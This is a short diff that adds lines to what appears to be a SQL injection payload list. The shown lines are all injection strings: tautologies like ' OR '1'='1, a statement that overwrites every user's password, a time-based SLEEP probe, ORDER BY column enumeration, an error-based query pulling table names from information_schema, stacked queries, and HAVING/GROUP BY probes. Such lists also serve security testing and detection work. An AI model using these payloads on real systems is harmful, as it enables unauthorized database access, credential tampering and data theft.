@@ -4,3 +4,11 @@
 '; UPDATE users SET password='hacked'--
 ' AND SLEEP(5)--
 from=User where name='' or '1'='1
+order by 1--
+order by 2--
+' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+1; SELECT * FROM users
+1 OR 1=1
+' HAVING 1=1--
+' GROUP BY username HAVING 1=1--
+1' OR '1'='1
